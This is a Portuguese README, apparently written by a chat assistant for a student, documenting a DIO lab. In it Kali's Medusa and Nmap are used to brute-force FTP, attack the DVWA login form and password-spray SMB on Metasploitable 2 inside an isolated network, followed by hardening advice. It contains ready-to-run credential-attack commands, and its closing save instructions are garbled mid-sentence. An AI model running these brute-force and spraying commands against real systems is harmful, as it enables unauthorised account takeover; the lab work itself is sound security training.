Abaixo está o conteúdo completo pronto para você copiar e salvar como README.md no seu repositório público do GitHub para a entrega do desafio na DIO.


Markdown
# Simulação de Ataques de Força Bruta e Mitigação com Kali Linux e Medusa

> **Aviso Ético e de Escopo:** Este projeto foi desenvolvido exclusivamente em ambiente local virtualizado e isolado (*Host-Only*), com objetivos educacionais, de auditoria defensiva e de compreensão de controles de autenticação e prevenção.

---

## 1. Visão Geral do Desafio

Este repositório documenta a implementação e análise conceitual de um laboratório prático de segurança da informação baseado no desafio da [DIO](https://web.dio.me/pricing?source=upgrade-pro-player-projects), utilizando [Kali Linux](https://www.kali.org/), [Medusa](http://www.foofus.net/jmk/medusa/medusa.html), [Nmap](https://nmap.org/book/), [Metasploitable 2](https://web.dio.me/lab/criando-um-ataque-de-brute-force-de-senhas-com-medusa-e-kali-linux/learning/8984ac93-a831-4c59-99ba-46619fcb779c?back=/play) e [DVWA](http://www.dvwa.co.uk/).

O foco do trabalho é compreender como falhas de autenticação e configurações frágeis ocorrem em diferentes serviços (FTP, aplicações web e SMB) e como aplicar medidas de mitigação e defesa em profundidade.

---

## 2. Arquitetura do Ambiente

O laboratório é estruturado no VirtualBox com isolamento de rede para evitar qualquer interferência em redes externas ou sistemas de terceiros:

* **Máquina de Auditoria e Análise:** [Kali Linux](https://www.kali.org/) (reconhecimento de rede com [Nmap](https://nmap.org/book/), testes com [Medusa](http://www.foofus.net/jmk/medusa/medusa.html) e validação via `smbclient`).
* **Máquina Alvo Controlada:** [Metasploitable 2](https://web.dio.me/lab/criando-um-ataque-de-brute-force-de-senhas-com-medusa-e-kali-linux/learning/8984ac93-a831-4c59-99ba-46619fcb779c?back=/play) (ambiente de prática contendo serviços legados e aplicações vulneráveis como o [DVWA](http://www.dvwa.co.uk/)).
* **Rede Interna (*Host-Only*):** Segmentação exclusiva entre o sistema hospedeiro e as máquinas virtuais, sem exposição direta à internet.

```text
[ Máquina Hospedeira ]
          │
          ▼ (Rede Host-Only Isolada)
┌──────────────────────┐         ┌────────────────────────┐
│  VM Kali Linux       │ ──────▶ │  VM Metasploitable 2   │
│  (Auditoria / Análise)│         │  (FTP / DVWA / SMB)    │
└──────────────────────┘         └────────────────────────┘
Validação Inicial de Rede e Serviços
Bash
# Verificar endereço de rede local na interface host-only
ip a

# Identificar hosts ativos na sub-rede interna
nmap -sn 192.168.56.0/24

# Mapear portas e serviços expostos no alvo
nmap -sS -sV -p 21,80,139,445 192.168.56.101
3. Wordlists e Cenários Simulados
Para os testes controlados, utilizam-se listas simples de estudo (usuarios.txt e senhas.txt, além de senha única para password spraying).


Cenário A: Força Bruta em FTP (Porta 21)
O protocolo FTP tradicional não criptografa credenciais e geralmente não impõe bloqueio nativo contra múltiplas tentativas seguidas.


Bash
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4
Cenário B: Automação em Formulário Web (DVWA)
Formulários web exigem mapeamento de campos, validação de resposta de falha e controle de sessão/cookies.


Bash
medusa -h 192.168.56.101 -u admin -P senhas.txt -M http \
  -m DIR:/dvwa/login.php \
  -m FORM:"username=_USER_&password=_PASSWORD_&Login=Login" \
  -m DENY:"Login failed" \
  -c "PHPSESSID=<VALOR_DA_SESSAO>; security=low"
Cenário C: Enumeração e Password Spraying em SMB (Portas 139/445)
Em vez de testar muitas senhas em uma única conta, o password spraying testa poucas senhas comuns em várias contas para evitar bloqueios por conta individual.
Bash
# Listar compartilhamentos acessíveis
smbclient -L //192.168.56.101 -N

# Simular password spraying com uma senha comum em vários usuários
medusa -h 192.168.56.101 -U usuarios.txt -p msfadmin -M smbnt

# Validar acesso em compartilhamento com smbclient
smbclient //192.168.56.101/tmp -U msfadmin
4. Recomendações de Mitigação e Hardening
•	Política de Senhas e MFA: Exigir senhas robustas, bloquear senhas comuns/vazadas e habilitar autenticação multifator (MFA).
•	Controle de Taxa e Bloqueio: Aplicar rate limiting, backoff progressivo, bloqueio temporário ou bloqueio de IP por regras de firewall/IDS (como Fail2Ban).
•	Hardening de Serviços: Substituir FTP por SFTP/FTPS, desativar versões inseguras de SMB (como SMBv1), restringir sessões nulas e proteger formulários web com validação de sessão, anti-CSRF e mensagens genéricas de erro.
•	Monitoramento Contínuo: Acompanhar logs de autenticação para identificar picos de falhas ou tentativas automatizadas precocemente.
5. Reflexões Pessoais e Aprendizados
•	Superfície de Risco: Senhas fracas, serviços legados ativos e ausência de rate limiting tornam sistemas vulneráveis a tentativas automatizadas.
•	Mentalidade Defensiva: Entender a mecânica dos vetores permite desenhar controles mais precisos, combinando prevenção, detecção por logs e resposta rápida.
•	Evolução Contínua: Consolidar a documentação técnica e a análise defensiva fortalece a capacidade de avaliar riscos e comunicar achados com clareza.
6. Checklist de Entrega no GitHub
•	[ ] Arquivo README.md salvo na raiz do repositório público.
•	[ ] Pastas de apoio organizadas (ex.: /wordlists e /images, se aplicável).
•	[ ] Nenhuma informação sensível, dado pessoal ou credencial real exposta.
•	[ ] Link do repositório verificado e pronto para envio na plataforma da DIO.
7. Referências
•	Documentação Oficial do Medusa
•	Manual Oficial do Nmap
•	Site Oficial do Kali Linux
•	DVWA – Damn Vulnerable Web Application
•	Documentação do GitHub

### Como salvar como arquivo `.md`
1. Copie todo olas iniciais e finais).
2. Abra o Bloco de Notas (ou seu editor de texto/VS Code), cole o conteúdo e salve com o nom o tipo de arquivo não fique `.md.txt`).
3. Envie para o seu repositório público no GitHub e cole o link na entrega do desafio.

